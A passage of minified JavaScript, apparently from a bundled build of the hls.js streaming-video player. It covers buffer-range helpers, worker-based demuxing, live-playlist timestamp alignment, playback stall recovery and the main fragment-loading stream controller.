e(t,r,n){try{if(t){var s,i=t.buffered,a=[];for(s=0;s<i.length;s++)a.push({start:i.start(s),end:i.end(s)});return this.bufferedInfo(a,r,n)}}catch(e){}return{len:0,start:r,end:r,nextStart:void 0}},e.bufferedInfo=function e(t,r,n){t.sort((function(e,t){var r=e.start-t.start;return r||t.end-e.end}));var i=[];if(n)for(var a=0;a<t.length;a++){var s=i.length;if(s){var o=i[s-1].end;t[a].start-o<n?t[a].end>o&&(i[s-1].end=t[a].end):i.push(t[a])}else i.push(t[a])}else i=t;for(var u,l=0,c=r,d=r,f=0;f<i.length;f++){var h=i[f].start,p=i[f].end;if(r+n>=h&&r<p)c=h,l=(d=p)-r;else if(r+n<h){u=h;break}}return{len:l,start:c,end:d,nextStart:u}},e}(),be=e("./node_modules/eventemitter3/index.js"),ke=e("./node_modules/webworkify-webpack/index.js"),_e=e("./src/demux/demuxer-inline.js");function s(){return window.MediaSource||window.WebKitMediaSource}var Te=e("./src/utils/get-self-scope.js");var Ce=function(e){function t(){return e.apply(this,arguments)||this}return function Se(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(t,e),t.prototype.trigger=function e(t){for(var r=arguments.length,n=new Array(r>1?r-1:0),i=1;i<r;i++)n[i-1]=arguments[i];this.emit.apply(this,[t,t].concat(n))},t}(be.EventEmitter),Re=Object(Te.getSelfScope)(),u=s()||{isTypeSupported:function e(){return!1}},we=function(){function e(n,e){var i=this;this.hls=n,this.id=e;var t=this.observer=new Ce,r=n.config,a=function e(t,r){(r=r||{}).frag=i.frag,r.id=i.id,n.trigger(t,r)};t.on(M.default.FRAG_DECRYPTED,a),t.on(M.default.FRAG_PARSING_INIT_SEGMENT,a),t.on(M.default.FRAG_PARSING_DATA,a),t.on(M.default.FRAG_PARSED,a),t.on(M.default.ERROR,a),t.on(M.default.FRAG_PARSING_METADATA,a),t.on(M.default.FRAG_PARSING_USERDATA,a),t.on(M.default.INIT_PTS_FOUND,a);var s={mp4:u.isTypeSupported("video/mp4"),mpeg:u.isTypeSupported("audio/mpeg"),mp3:u.isTypeSupported('audio/mp4; codecs="mp3"')},o=navigator.vendor;if(r.enableWorker&&"undefined"!=typeof Worker){var l;F.logger.log("demuxing in webworker");try{l=this.w=ke("./src/demux/demuxer-worker.js"),this.onwmsg=this.onWorkerMessage.bind(this),l.addEventListener("message",this.onwmsg),l.onerror=function(e){n.trigger(M.default.ERROR,{type:A.ErrorTypes.OTHER_ERROR,details:A.ErrorDetails.INTERNAL_EXCEPTION,fatal:!0,event:"demuxerWorker",err:{message:e.message+" ("+e.filename+":"+e.lineno+")"}})},l.postMessage({cmd:"init",typeSupported:s,vendor:o,id:e,config:JSON.stringify(r)})}catch(e){F.logger.warn("Error in worker:",e),F.logger.error("Error while initializing DemuxerWorker, fallback on DemuxerInline"),l&&Re.URL.revokeObjectURL(l.objectURL),this.demuxer=new _e.default(t,s,r,o),this.w=void 0}}else this.demuxer=new _e.default(t,s,r,o)}var t=e.prototype;return t.destroy=function e(){var t=this.w;if(t)t.removeEventListener("message",this.onwmsg),t.terminate(),this.w=null;else{var r=this.demuxer;r&&(r.destroy(),this.demuxer=null)}var n=this.observer;n&&(n.removeAllListeners(),this.observer=null)},t.push=function e(t,r,n,i,a,s,o,l){var u=this.w,c=Object(x.isFiniteNumber)(a.startPTS)?a.startPTS:a.start,d=a.decryptdata,f=this.frag,h=!(f&&a.cc===f.cc),p=!(f&&a.level===f.level),v=f&&a.sn===f.sn+1,g=!p&&v;if(h&&F.logger.log(this.id+":discontinuity detected"),p&&F.logger.log(this.id+":switch detected"),this.frag=a,u)u.postMessage({cmd:"demux",data:t,decryptdata:d,initSegment:r,audioCodec:n,videoCodec:i,timeOffset:c,discontinuity:h,trackSwitch:p,contiguous:g,duration:s,accurateTimeOffset:o,defaultInitPTS:l},t instanceof ArrayBuffer?[t]:[]);else{var A=this.demuxer;A&&A.push(t,d,r,n,i,c,h,p,g,s,o,l)}},t.onWorkerMessage=function e(t){var r=t.data,n=this.hls;switch(r.event){case"init":Re.URL.revokeObjectURL(this.w.objectURL);break;case M.default.FRAG_PARSING_DATA:r.data.data1=new Uint8Array(r.data1),r.data2&&(r.data.data2=new Uint8Array(r.data2));default:r.data=r.data||{},r.data.frag=this.frag,r.data.id=this.id,n.trigger(r.event,r.data)}},e}(),v=we;function Oe(e,t,r){switch(t){case"audio":e.audioGroupIds||(e.audioGroupIds=[]),e.audioGroupIds.push(r);break;case"text":e.textGroupIds||(e.textGroupIds=[]),e.textGroupIds.push(r)}}function Le(e,t,r){var n=e[t],i=e[r],a=i.startPTS;if(Object(x.isFiniteNumber)(a))r>t?(n.duration=a-n.start,n.duration<0&&F.logger.warn("negative duration computed for frag "+n.sn+",level "+n.level+", there should be some duration drift between playlist and fragment!")):(i.duration=n.start-a,i.duration<0&&F.logger.warn("negative duration computed for frag "+i.sn+",level "+i.level+", there should be some duration drift between playlist and fragment!"));else if(r>t){var s=n.cc===i.cc;i.start=n.start+(s&&n.minEndPTS?n.minEndPTS-n.start:n.duration)}else i.start=Math.max(n.start-i.duration,0)}function Ie(e,t,r,n,i,a){var s=r,o=n;if(Object(x.isFiniteNumber)(t.startPTS)){var l=Math.abs(t.startPTS-r);Object(x.isFiniteNumber)(t.deltaPTS)?t.deltaPTS=Math.max(l,t.deltaPTS):t.deltaPTS=l,s=Math.max(r,t.startPTS),r=Math.min(r,t.startPTS),o=Math.min(n,t.endPTS),n=Math.max(n,t.endPTS),i=Math.min(i,t.startDTS),a=Math.max(a,t.endDTS)}var u=r-t.start;t.start=t.startPTS=r,t.maxStartPTS=s,t.endPTS=n,t.minEndPTS=o,t.startDTS=i,t.endDTS=a,t.duration=n-r;var d,f,h,c=t.sn;if(!e||c<e.startSN||c>e.endSN)return 0;for(d=c-e.startSN,(f=e.fragments)[d]=t,h=d;h>0;h--)Le(f,h,h-1);for(h=d;h<f.length-1;h++)Le(f,h,h+1);return e.PTSKnown=!0,u}function De(e,r){r.initSegment&&e.initSegment&&(r.initSegment=e.initSegment);var i,n=0;if(Ne(e,r,(function(e,t){n=e.cc-t.cc,Object(x.isFiniteNumber)(e.startPTS)&&(t.start=t.startPTS=e.startPTS,t.endPTS=e.endPTS,t.duration=e.duration,t.backtracked=e.backtracked,t.dropped=e.dropped,i=t),r.PTSKnown=!0})),r.PTSKnown){if(n){F.logger.log("discontinuity sliding from playlist, take drift into account");for(var t=r.fragments,a=0;a<t.length;a++)t[a].cc+=n}i?Ie(r,i,i.startPTS,i.endPTS,i.startDTS,i.endDTS):function xe(e,t){var r=t.startSN-e.startSN,n=e.fragments,i=t.fragments;if(r<0||r>n.length)return;for(var a=0;a<i.length;a++)i[a].start+=n[r].start}(e,r),r.PTSKnown=e.PTSKnown}}function Ne(e,t,r){if(e&&t)for(var n=Math.max(e.startSN,t.startSN)-t.startSN,i=Math.min(e.endSN,t.endSN)-t.startSN,a=t.startSN-e.startSN,s=n;s<=i;s++){var o=e.fragments[a+s],l=t.fragments[s];if(!o||!l)break;r(o,l,s)}}function Me(e,t,r){var n=1e3*(t.averagetargetduration?t.averagetargetduration:t.targetduration),i=n/2;return e&&t.endSN===e.endSN&&(n=i),r&&(n=Math.max(i,n-(window.performance.now()-r))),Math.round(n)}var Be={toString:function e(t){for(var r="",n=t.length,i=0;i<n;i++)r+="["+t.start(i).toFixed(3)+","+t.end(i).toFixed(3)+"]";return r}};function Ke(r,e){e.fragments.forEach((function(e){if(e){var t=e.start+r;e.start=e.startPTS=t,e.endPTS=t+e.duration}})),e.PTSKnown=!0}function Ye(e,t,r){!function He(e,t,r){if(function Ve(e,t,r){var n=!1;return t&&t.details&&r&&(r.endCC>r.startCC||e&&e.cc<r.startCC)&&(n=!0),n}(e,r,t)){var n=function Ge(e,t){var r=e.fragments,n=t.fragments;if(n.length&&r.length){var i=function Ue(e,t){for(var r=null,n=0;n<e.length;n+=1){var i=e[n];if(i&&i.cc===t){r=i;break}}return r}(r,n[0].cc);if(i&&(!i||i.startPTS))return i;F.logger.log("No frag in previous level to align on")}else F.logger.log("No fragments to align")}(r.details,t);n&&(F.logger.log("Adjusting PTS using last level due to CC increase within current level"),Ke(n.start,t))}}(e,r,t),!r.PTSKnown&&t&&function ze(e,t){if(t&&t.fragments.length){if(!e.hasProgramDateTime||!t.hasProgramDateTime)return;var r=t.fragments[0].programDateTime,i=(e.fragments[0].programDateTime-r)/1e3+t.fragments[0].start;Object(x.isFiniteNumber)(i)&&(F.logger.log("adjusting PTS using programDateTime delta, sliding:"+i.toFixed(3)),Ke(i,e))}}(r,t.details)}function $e(e,t,r){if(null===t||!Array.isArray(e)||!e.length||!Object(x.isFiniteNumber)(t))return null;if(t<(e[0].programDateTime||0))return null;if(t>=(e[e.length-1].endProgramDateTime||0))return null;r=r||0;for(var a=0;a<e.length;++a){var s=e[a];if(qe(t,r,s))return s}return null}function We(e,t,r,n){void 0===r&&(r=0),void 0===n&&(n=0);var i=null;if(e?i=t[e.sn-t[0].sn+1]:0===r&&0===t[0].start&&(i=t[0]),i&&0===V(r,n,i))return i;var a=U.search(t,V.bind(null,r,n));return a||i}function V(e,t,r){void 0===e&&(e=0),void 0===t&&(t=0);var n=Math.min(t,r.duration+(r.deltaPTS?r.deltaPTS:0));return r.start+r.duration-n<=e?1:r.start-n>e&&r.start?-1:0}function qe(e,t,r){var n=1e3*Math.min(t,r.duration+(r.deltaPTS?r.deltaPTS:0));return(r.endProgramDateTime||0)-n>e}var Je=function(){function e(e,t,r,n){this.config=e,this.media=t,this.fragmentTracker=r,this.hls=n,this.nudgeRetry=0,this.stallReported=!1,this.stalled=null,this.moved=!1,this.seeking=!1}var t=e.prototype;return t.poll=function e(t){var r=this.config,n=this.media,i=this.stalled,a=n.currentTime,s=n.seeking,o=this.seeking&&!s,l=!this.seeking&&s;if(this.seeking=s,a===t){if((l||o)&&(this.stalled=null),!n.paused&&!n.ended&&0!==n.playbackRate&&n.buffered.length){var c=j.bufferInfo(n,a,0),d=c.len>0,f=c.nextStart||0;if(d||f){if(s){var h=c.len>2,p=!f||f-a>2&&!this.fragmentTracker.getPartialFragment(a);if(h||p)return;this.moved=!1}if(!this.moved&&this.stalled){var v=Math.max(f,c.start||0)-a;if(v>0&&v<=2)return void this._trySkipBufferHole(null)}var g=self.performance.now();if(null!==i){var A=g-i;!s&&A>=250&&this._reportStall(c.len);var m=j.bufferInfo(n,a,r.maxBufferHole);this._tryFixBufferStall(m,A)}else this.stalled=g}}}else if(this.moved=!0,null!==i){if(this.stallReported){var u=self.performance.now()-i;F.logger.warn("playback not stuck anymore @"+a+", after "+Math.round(u)+"ms"),this.stallReported=!1}this.stalled=null,this.nudgeRetry=0}},t._tryFixBufferStall=function e(t,r){var n=this.config,i=this.fragmentTracker,s=this.media.currentTime,o=i.getPartialFragment(s);if(o&&this._trySkipBufferHole(o))return;t.len>n.maxBufferHole&&r>1e3*n.highBufferWatchdogPeriod&&(F.logger.warn("Trying to nudge playhead over buffer-hole"),this.stalled=null,this._tryNudgeBuffer())},t._reportStall=function e(t){var r=this.hls,n=this.media;this.stallReported||(this.stallReported=!0,F.logger.warn("Playback stalling at @"+n.currentTime+" due to low buffer (buffer="+t+")"),r.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:A.ErrorDetails.BUFFER_STALLED_ERROR,fatal:!1,buffer:t}))},t._trySkipBufferHole=function e(t){for(var r=this.config,n=this.hls,i=this.media,a=i.currentTime,s=0,o=0;o<i.buffered.length;o++){var l=i.buffered.start(o);if(a+r.maxBufferHole>=s&&a<l){var u=Math.max(l+.05,i.currentTime+.1);return F.logger.warn("skipping hole, adjusting currentTime from "+a+" to "+u),this.moved=!0,this.stalled=null,i.currentTime=u,t&&n.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:A.ErrorDetails.BUFFER_SEEK_OVER_HOLE,fatal:!1,reason:"fragment loaded with buffer holes, seeking from "+a+" to "+u,frag:t}),u}s=i.buffered.end(o)}return 0},t._tryNudgeBuffer=function e(){var t=this.config,r=this.hls,n=this.media,i=n.currentTime,a=(this.nudgeRetry||0)+1;if(this.nudgeRetry=a,a<t.nudgeMaxRetry){var s=i+a*t.nudgeOffset;F.logger.warn("Nudging 'currentTime' from "+i+" to "+s),n.currentTime=s,r.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:A.ErrorDetails.BUFFER_NUDGE_ON_STALL,fatal:!1})}else F.logger.error("Playhead still not moving while enough data buffered @"+i+" after "+t.nudgeMaxRetry+" nudges"),r.trigger(M.default.ERROR,{type:A.ErrorTypes.MEDIA_ERROR,details:A.ErrorDetails.BUFFER_STALLED_ERROR,fatal:!0})},e}();var rt=function(a){function e(e){for(var t,r=arguments.length,n=new Array(r>1?r-1:0),i=1;i<r;i++)n[i-1]=arguments[i];return(t=a.call.apply(a,[this,e].concat(n))||this)._boundTick=void 0,t._tickTimer=null,t._tickInterval=null,t._tickCallCount=0,t._boundTick=t.tick.bind(function et(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}(t)),t}!function tt(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,a);var t=e.prototype;return t.onHandlerDestroying=function e(){this.clearNextTick(),this.clearInterval()},t.hasInterval=function e(){return!!this._tickInterval},t.hasNextTick=function e(){return!!this._tickTimer},t.setInterval=function e(t){return!this._tickInterval&&(this._tickInterval=self.setInterval(this._boundTick,t),!0)},t.clearInterval=function e(){return!!this._tickInterval&&(self.clearInterval(this._tickInterval),this._tickInterval=null,!0)},t.clearNextTick=function e(){return!!this._tickTimer&&(self.clearTimeout(this._tickTimer),this._tickTimer=null,!0)},t.tick=function e(){this._tickCallCount++,1===this._tickCallCount&&(this.doTick(),this._tickCallCount>1&&(this.clearNextTick(),this._tickTimer=self.setTimeout(this._boundTick,0)),this._tickCallCount=0)},t.doTick=function e(){},e}(i);var K_STOPPED="STOPPED",K_STARTING="STARTING",K_IDLE="IDLE",K_PAUSED="PAUSED",K_KEY_LOADING="KEY_LOADING",K_FRAG_LOADING="FRAG_LOADING",K_FRAG_LOADING_WAITING_RETRY="FRAG_LOADING_WAITING_RETRY",K_WAITING_TRACK="WAITING_TRACK",K_PARSING="PARSING",K_PARSED="PARSED",K_BUFFER_FLUSHING="BUFFER_FLUSHING",K_ENDED="ENDED",K_ERROR="ERROR",K_WAITING_INIT_PTS="WAITING_INIT_PTS",K_WAITING_LEVEL="WAITING_LEVEL",it=function(t){function e(){return t.apply(this,arguments)||this}!function nt(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,t);var r=e.prototype;return r.doTick=function e(){},r.startLoad=function e(){},r.stopLoad=function e(){var t=this.fragCurrent;t&&(t.loader&&t.loader.abort(),this.fragmentTracker.removeFragment(t)),this.demuxer&&(this.demuxer.destroy(),this.demuxer=null),this.fragCurrent=null,this.fragPrevious=null,this.clearInterval(),this.clearNextTick(),this.state=K_STOPPED},r._streamEnded=function e(t,r){var n=this.fragCurrent,i=this.fragmentTracker;if(!r.live&&n&&!n.backtracked&&n.sn===r.endSN&&!t.nextStart){var a=i.getState(n);return a===B_PARTIAL||a===B_OK}return!1},r.onMediaSeeking=function e(){var t=this.config,r=this.media,n=this.mediaBuffer,i=this.state,a=r?r.currentTime:null,s=j.bufferInfo(n||r,a,this.config.maxBufferHole);if(F.logger.log("media seeking to "+(Object(x.isFiniteNumber)(a)?a.toFixed(3):a)),i===K_FRAG_LOADING){var o=this.fragCurrent;if(0===s.len&&o){var l=t.maxFragLookUpTolerance,u=o.start-l,c=o.start+o.duration+l;a<u||a>c?(o.loader&&(F.logger.log("seeking outside of buffer while fragment load in progress, cancel fragment load"),o.loader.abort()),this.fragCurrent=null,this.fragPrevious=null,this.state=K_IDLE):F.logger.log("seeking outside of buffer but within currently loaded fragment range")}}else i===K_ENDED&&(0===s.len&&(this.fragPrevious=null,this.fragCurrent=null),this.state=K_IDLE);r&&(this.lastCurrentTime=a),this.loadedmetadata||(this.nextLoadPosition=this.startPosition=a),this.tick()},r.onMediaEnded=function e(){this.startPosition=this.lastCurrentTime=0},r.onHandlerDestroying=function e(){this.stopLoad(),t.prototype.onHandlerDestroying.call(this)},r.onHandlerDestroyed=function e(){this.state=K_STOPPED,this.fragmentTracker=null},r.computeLivePosition=function e(t,r){var n=void 0!==this.config.liveSyncDuration?this.config.liveSyncDuration:this.config.liveSyncDurationCount*r.targetduration;return t+Math.max(0,r.totalduration-n)},e}(rt);function at(e,t){for(var r=0;r<t.length;r++){var n=t[r];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var pt,ut=function(n){function e(e,t){var r;return(r=n.call(this,e,M.default.MEDIA_ATTACHED,M.default.MEDIA_DETACHING,M.default.MANIFEST_LOADING,M.default.MANIFEST_PARSED,M.default.LEVEL_LOADED,M.default.LEVELS_UPDATED,M.default.KEY_LOADED,M.default.FRAG_LOADED,M.default.FRAG_LOAD_EMERGENCY_ABORTED,M.default.FRAG_PARSING_INIT_SEGMENT,M.default.FRAG_PARSING_DATA,M.default.FRAG_PARSED,M.default.ERROR,M.default.AUDIO_TRACK_SWITCHING,M.default.AUDIO_TRACK_SWITCHED,M.default.BUFFER_CREATED,M.default.BUFFER_APPENDED,M.default.BUFFER_FLUSHED)||this).fragmentTracker=t,r.config=e.config,r.audioCodecSwap=!1,r._state=K_STOPPED,r.stallReported=!1,r.gapController=null,r.altAudio=!1,r.audioOnly=!1,r.bitrateTest=!1,r}!function ot(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,e.__proto__=t}(e,n);var t=e.prototype;return t.startLoad=function e(t){if(this.levels){var r=this.lastCurrentTime,n=this.hls;if(this.stopLoad(),this.setInterval(100),this.level=-1,this.fragLoadError=0,!this.startFragRequested){var i=n.startLevel;-1===i&&(n.config.testBandwidth?(i=0,this.bitrateTest=!0):i=n.nextAutoLevel),this.level=n.nextLoadLevel=i,this.loadedmetadata=!1}r>0&&-1===t&&(F.logger.log("override startPosition with lastCurrentTime @"+r.toFixed(3)),t=r),this.state=K_IDLE,this.nextLoadPosition=this.startPosition=this.lastCurrentTime=t,this.tick()}else this.forceStartLoad=!0,this.state=K_STOPPED},t.stopLoad=function e(){this.forceStartLoad=!1,n.prototype.stopLoad.call(this)},t.doTick=function e(){switch(this.state){case K_BUFFER_FLUSHING:this.fragLoadError=0;break;case K_IDLE:this._doTickIdle();break;case K_WAITING_LEVEL:var t=this.levels[this.level];t&&t.details&&(this.state=K_IDLE);break;case K_FRAG_LOADING_WAITING_RETRY:var r=window.performance.now(),n=this.retryDate;(!n||r>=n||this.media&&this.media.seeking)&&(F.logger.log("mediaController: retryDate reached, switch back to IDLE state"),this.state=K_IDLE)}this._checkBuffer(),this._checkFragmentChanged()},t._doTickIdle=function e(){var t=this.hls,r=t.config,n=this.media;if(void 0!==this.levelLastLoaded&&(n||!this.startFragRequested&&r.startFragPrefetch))if(this.altAudio&&this.audioOnly)this.demuxer.frag=null;else{var i;i=this.loadedmetadata?n.currentTime:this.nextLoadPosition;var a=t.nextLoadLevel,s=this.levels[a];if(s){var l,o=s.bitrate;l=o?Math.max(8*r.maxBufferSize/o,r.maxBufferLength):r.maxBufferLength,l=Math.min(l,r.maxMaxBufferLength);var u=i<r.maxBufferHole?Math.max(2,r.maxBufferHole):r.maxBufferHole,c=j.bufferInfo(this.mediaBuffer?this.mediaBuffer:n,i,u),d=c.len;if(!(d>=l)){F.logger.trace("buffer length of "+d.toFixed(3)+" is below max of "+l.toFixed(3)+". checking for more payload ..."),this.level=t.nextLoadLevel=a;var f=s.details;if(!f||f.live&&this.levelLastLoaded!==a)this.state=K_WAITING_LEVEL;else{if(this._streamEnded(c,f)){var h={};return this.altAudio&&(h.type="video"),this.hls.trigger(M.default.BUFFER_EOS,h),void(this.state=K_ENDED)}this._fetchPayloadOrEos(i,c,f)}}}}},t._fetchPayloadOrEos=function e(t,r,n){var i=this.fragPrevious;this.level;var a=n.fragments,s=a.length;if(0!==s){var c,o=a[0].start,l=a[s-1].start+a[s-1].duration,u=r.end;if(n.initSegment&&!n.initSegment.data)c=n.initSegment;else if(n.live){var d=this.config.initialLiveManifestSize;if(s<d)return void F.logger.warn("Can not start playback of a level, reason: not enough fragments "+s+" < "+d);if(null===(c=this._ensureFragmentAtLivePoint(n,u,o,l,i,a)))return}else u<o&&(c=a[0]);c||(c=this._findFragment(o,i,s,a,u,l,n)),c&&(c.encrypted?this._loadKey(c,n):this._loadFragment(c,n,t,u))}},t._ensureFragmentAtLivePoint=function e(t,r,n,i,a,s){var u,o=this.hls.config,l=this.media,c=1/0;if(void 0!==o.liveMaxLatencyDuration?c=o.liveMaxLatencyDuration:Object(x.isFiniteNumber)(o.liveMaxLatencyDurationCount)&&(c=o.liveMaxLatencyDurationCount*t.targetduration),r<Math.max(n-o.maxFragLookUpTolerance,i-c)){var d=this.liveSyncPosition=this.computeLivePosition(n,t);r=d,l&&!l.paused&&l.readyState&&l.duration>d&&d>l.currentTime&&(F.logger.log("buffer end: "+r.toFixed(3)+" is located too far from the end of live sliding playlist, reset currentTime to : "+d.toFixed(3)),l.currentTime=d),this.nextLoadPosition=d}if(t.PTSKnown&&r>i&&l&&l.readyState)return null;if(this.startFragRequested&&!t.PTSKnown&&a)if(t.hasProgramDateTime)F.logger.log("live playlist, switching playlist, load frag with same PDT: "+a.programDateTime),u=$e(s,a.endProgramDateTime,o.maxFragLookUpTolerance);else{var f=a.sn+1;if(f>=t.startSN&&f<=t.endSN){var h=s[f-t.startSN];a.cc===h.cc&&(u=h,F.logger.log("live playlist, switching playlist, load frag with next SN: "+u.sn))}u||(u=U.search(s,(function(e){return a.cc-e.cc})),u&&F.logger.log("live playlist, switching playlist, load frag with same CC: "+u.sn))}return u},t._findFragment=function e(t,r,n,i,a,s,o){var u,l=this.hls.config;a<s?u=We(r,i,a,a>s-l.maxFragLookUpTolerance?0:l.maxFragLookUpTolerance):u=i[n-1];if(u){var d=u.sn-o.startSN,f=r&&u.level===r.level,h=i[d-1],p=i[d+1];if(r&&u.sn===r.sn)if(f&&!u.backtracked)if(u.sn<o.endSN){var v=r.deltaPTS;v&&v>l.maxBufferHole&&r.dropped&&d?(u=h,F.logger.warn("Previous fragment was dropped with large PTS gap between audio and video. Maybe fragment is not starting with a keyframe? Loading previous one to try to overcome this")):(u=p,this.fragmentTracker.getState(u)!==B_OK&&F.logger.log("Re-loading fragment with SN: "+u.sn))}else u=null;else u.backtracked&&(p&&p.backtracked?(F.logger.warn("Already backtracked from fragment "+p.sn+", will not backtrack to fragment "+u.sn+". Loading fragment "+p.sn),u=p):(F.logger.warn("Loaded fragment with dropped frames, backtracking 1 segment to find a keyframe"),u.dropped=0,h?(u=h).backtracked=!0:d&&(u=null)))}return u},t._loadKey=function e(t,r){F.logger.log("Loading key for "+t.sn+" of ["+r.startSN+"-"+r.endSN+"], level "+this.level),this.state=K_KEY_LOADING,this.hls.trigger(M.default.KEY_LOADING,{frag:t})},t._loadFragment=function e(t,r,n,i){var a=this.fragmentTracker.getState(t);this.fragCurrent=t,"initSegment"!==t.sn&&(this.startFragRequested=!0),Object(x.isFiniteNumber)(t.sn)&&!t.bitrateTest&&(this.nextLoadPosition=t.start+t.duration),t.backtracked||a===B_NOT_LOADED||a===B_PARTIAL?(t.autoLevel=this.hls.autoLevelEnabled,t.bitrateTest=this.bitrateTest,F.logger.log("Loading "+t.sn+" of ["+r.startSN+"-"+r.endSN+"], level "+this.level+", "+(this.loadedmetadata?"currentTime":"nextLoadPosition")+": "+parseFloat(n.toFixed(3))+", bufferEnd: "+parseFloat(i.toFixed(3))),this.hls.trigger(M.default.FRAG_LOADING,{frag:t}),this.demuxer||(this.demuxer=new v(this.hls,"main")),this.state=K_FRAG_LOADING):a===B_APPENDING&&this._reduceMaxBufferLength(t.duration)&&this.fragmentTracker.removeFragment(t)},t.getBufferedFrag=function e(t){return this.fragmentTracker.getBufferedFrag(t,a.MAIN)},t.followingBufferedFrag=function e(t){return t?this.getBufferedFrag(t.endPTS+.5):null},t._checkFragmentChanged=function e(){var t,r,n=this.media;if(n&&n.readyState&&!1===n.seeking&&((r=n.currentTime)>this.lastCurrentTime&&(this.lastCurrentTime=r),j.isBuffered(n,r)?t=this.getBufferedFrag(r):j.isBuffered(n,r+.1)&&(t=this.getBufferedFrag(r+.1)),t)){var i=t;if(i!==this.fragPlaying){this.hls.trigger(M.default.FRAG_CHANGED,{frag:i});var a=i.level;this.fragPlaying&&this.fragPlaying.level===a||this.hls.trigger(M.default.LEVEL_SWITCHED,{level:a}),this.fragPlaying=i}}},t.immediateLevelSwitch=function e(){if(F.logger.log("immediateLevelSwitch"),!this.immediateSwitch){this.immediateSwitch=!0;var r,t=this.media;t?(r=t.paused)||t.pause():r=!0,this.previouslyPaused=r}var n=this.fragCurrent;n&&n.loader&&n.loader.abort(),this.fragCurrent=null,this.flushMainBuffer(0,Number.POSITIVE_INFINITY)},t.immediateLevelSwitchEnd=function e(){var t=this.media;t&&t.buffered.length&&(this.immediateSwitch=!1,t.currentTime>0&&j.isBuffered(t,t.currentTime)&&(t.currentTime-=1e-4),this.previouslyPaused||t.play())},t.nextLevelSwitch=function e(){var t=this.media;if(t&&t.readyState){var r,n=this.getBufferedFrag(t.currentTime);if(n&&n.startPTS>1&&this.flushMainBuffer(0,n.startPTS-1),t.paused)r=0;else{var i=this.hls.nextLoadLevel,a=this.levels[i],s=this.fragLastKbps;r=s&&this.fragCurrent?this.fragCurrent.duration*a.bitrate/(1e3*s)+1:0}var o=this.getBufferedFrag(t.currentTime+r);if(o){var l=this.followingBufferedFrag(o);if(l){var u=this.fragCurrent;u&&u.loader&&u.loader.abort(),this.fragCurrent=null;var c=Math.max(o.endPTS,l.maxStartPTS+Math.min(this.config.maxFragLookUpTolerance,l.duration));this.flushMainBuffer(c,Number.POSITIVE_INFINITY)}}}},t.flushMainBuffer=function e(t,r){this.state=K_BUFFER_FLUSHING;var n={startOffset:t,endOffset:r};this.altAudio&&(n.type="video"),this.hls.trigger(M.default.BUFFER_FLUSHING,n)},t.onMediaAttached=function e(t){var r=this.media=this.mediaBuffer=t.media;this.onvseeking=this.onMediaSeeking.bind(this),this.onvseeked=this.onMediaSeeked.bind(this),this.onvended=this.onMediaEnded.bind(this),r.addEventListener("seeking",this.onvseeking),r.addEventListener("seeked",this.onvseeked),r.addEventListener("ended",this.onvended);var n=this.config;this.levels&&n.autoStartLoad&&this.hls.startLoad(n.startPosition),this.gapController=new Je(n,r,this.fragmentTracker,this.hls)},t.onMediaDetaching=function e(){var t=this.media;t&&t.ended&&(F.logger.log("MSE detaching and video ended, reset startPosition"),this.startPosition=this.lastCurrentTime=0);var r=this.levels;r&&r.forEach((function(e){e.details&&e.details.fragments.forEach((function(e){e.backtracked=void 0}))})),t&&(t.removeEventListener("seeking",this.onvseeking),t.removeEventListener("seeked",this.onvseeked),t.removeEventListener("ended",this.onvended),this.onvseeking=this.onvseeked=this.onvended=null),this.fragmentTracker.removeAllFragments(),this.media=this.mediaBuffer=null,this.loadedmetadata=!1,this.stopLoad()},t.onMediaSeeked=function e(){var t=this.media,r=t?t.currentTime:void 0;Object(x.isFiniteNumber)(r)&&F.logger.log("media seeked to "+r.toFixed(3)),this.tick()},t.onManifestLoading=function e(){F.logger.log("trigger BUFFER_RESET"),this.hls.trigger(M.default.BUFFER_RESET),this.fragmentTracker.removeAllFragments(),this.stalled=!1,this.startPosition=this.lastCurrentTime=0},t.onManifestParsed=function e(t){var i,r=!1,n=!1;t.levels.forEach((function(e){(i=e.audioCodec)&&(-1!==i.indexOf("mp4a.40.2")&&(r=!0),-1!==i.indexOf("mp4a.40.5")&&(n=!0))})),this.audioCodecSwitch=r&&n,this.audioCodecSwitch&&F.logger.log("both AAC/HE-AAC audio found in levels; declaring level codec as HE-AAC"),this.altAudio=t.altAudio,this.levels=t.levels,this.startFragRequested=!1;var a=this.config;(a.autoStartLoad||this.forceStartLoad)&&this.hls.startLoad(a.startPosition)},t.onLevelLoaded=function e(t){var r=t.details,n=t.level,i=this.levels[this.levelLastLoaded],a=this.levels[n],s=r.totalduration,o=0;if(F.logger.log("level "+n+" loaded ["+r.startSN+","+r.endSN+"],duration:"+s),r.live||a.details&&a.details.live){var l=a.details;l&&r.fragments.length>0?(De(l,r),o=r.fragments[0].start,this.liveSyncPosition=this.computeLivePosition(o,l),r.PTSKnown&&Object(x.isFiniteNumber)(o)?F.logger.log("live playlist sliding:"+o.toFixed(3)):(F.logger.log("live playlist - outdated PTS, unknown sliding"),Ye(this.fragPrevious,i,r))):(F.logger.log("live playlist - first load, unknown sliding"),r.PTSKnown=!1,Ye(this.fragPrevious,i,r))}else r.PTSKnown=!1;if(a.details=r,this.levelLastLoaded=n,this.hls.trigger(M.default.LEVEL_UPDATED,{details:r,level:n}),!1===this.startFragRequested){if(-1===this.startPosition||-1===this.lastCurrentTime){var u=r.startTimeOffset;Object(x.isFiniteNumber)(u)?(u<0&&(F.logger.log("negative start time offset "+u+", count from end of last fragment"),u=o+s+u),F.logger.log("start time offset found in playlist, adjust startPosition to "+u),this.startPosition=u):r.live?(this.startPosition=this.computeLivePosition(o,r),F.logger.log("configure startPosition to "+this.startPosition)):this.startPosition=0,this.lastCurrentTime=this.startPosition}this.nextLoadPosition=this.startPosition}this.state===K_WAITING_LEVEL&&(this.state=K_IDLE),this.tick()},t.onKeyLoaded=function e(){this.state===K_KEY_LOADING&&(this.state=K_IDLE,this.tick())},t.onFragLoaded=function e(t){var 